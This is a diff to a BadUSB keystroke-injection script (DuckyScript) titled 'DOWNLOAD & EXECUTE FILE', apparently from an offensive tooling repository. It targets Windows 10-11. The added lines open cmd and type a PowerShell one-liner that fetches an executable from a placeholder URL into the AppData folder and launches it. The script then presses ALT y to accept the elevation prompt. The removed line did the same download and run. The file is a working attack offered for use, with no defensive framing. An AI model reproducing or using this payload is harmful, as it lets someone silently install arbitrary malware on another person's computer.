@@ -5,15 +5,19 @@
 REM ############################################
 REM # Title    : DOWNLOAD & EXECUTE FILE       |
 REM # Author   : RXSEESH                       |
-REM # Version  : PRIVATE                       |
+REM # Version  : PRIVATE & FIXED V1.1          |
 REM # Category : EXECUTION                     |
 REM # Target   : WINDOWS 10-11                 |
 REM ############################################
 REM   @guns.lol/RXSEESH | @github.com/RXSEESH
 GUI r
 DELAY 750
-STRING powershell -command "iwr -Uri 'YOUR_LINK' -OutFile \"$env:APPDATA\file.exe\"; Start-Process \"$env:APPDATA\file.exe\""
-DELAY 750
+STRING cmd
+DELAY 150
+ENTER
+DELAY 500
+STRING powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; iwr -Uri 'YOUR_URL' -OutFile \"$env:APPDATA\file.exe\"; Start-Process \"$env:APPDATA\file.exe\""
+DELAY 200
 ENTER
 DELAY 5000
 ALT y
